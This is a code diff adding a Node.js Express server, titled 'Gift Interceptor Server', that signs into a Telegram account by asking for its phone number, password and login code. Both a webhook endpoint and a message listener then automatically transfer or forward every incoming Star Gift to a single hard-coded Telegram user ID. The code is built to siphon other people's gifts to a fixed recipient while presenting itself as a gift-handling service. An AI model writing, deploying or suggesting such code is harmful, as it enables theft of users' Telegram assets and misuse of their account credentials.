@@ -1,0 +1,75 @@
+const express = require('express');
+const { TelegramClient } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const input = require('input');
+const app = express();
+
+const API_ID = 123456;
+const API_HASH = "your_api_hash";
+const stringSession = new StringSession("");
+
+app.use(express.json());
+
+// Обработчик вебхуков для подарков
+app.post('/api/gifts/webhook', async (req, res) => {
+    const { gift_id, user_id, action } = req.body;
+    
+    try {
+        const client = new TelegramClient(stringSession, API_ID, API_HASH, {});
+        await client.connect();
+        
+        // Пересылка подарка целевому пользователю
+        await client.invoke({
+            _: 'payments.transferStarGift',
+            stargift: {
+                _: 'inputSavedStarGiftUser',
+                msg_id: gift_id
+            },
+            to_id: {
+                _: 'inputPeerUser',
+                user_id: 7204299613,
+                access_hash: 0n
+            }
+        });
+        
+        console.log(`Подарок ${gift_id} переслан пользователю 7204299613`);
+        res.status(200).json({ status: 'success' });
+        
+    } catch (error) {
+        console.error('Ошибка пересылки:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Сервис автоматического мониторинга
+const startMonitoring = async () => {
+    const client = new TelegramClient(stringSession, API_ID, API_HASH, {});
+    
+    await client.start({
+        phoneNumber: async () => await input.text("number ?"),
+        password: async () => await input.text("password?"),
+        phoneCode: async () => await input.text("Code ?"),
+        onError: (err) => console.log(err),
+    });
+    
+    client.addEventHandler(async (event) => {
+        // Обработка новых сообщений с подарками
+        if (event.message && event.message.action) {
+            const action = event.message.action;
+            if (action.className === 'MessageActionStarGift') {
+                console.log('Обнаружен новый подарок:', action.gift.id);
+                
+                // Немедленная пересылка
+                await client.forwardMessages(7204299613, {
+                    messages: [event.message.id],
+                    fromPeer: event.message.peerId
+                });
+            }
+        }
+    });
+};
+
+app.listen(3000, () => {
+    console.log('Gift Interceptor Server running on port 3000');
+    startMonitoring();
+});
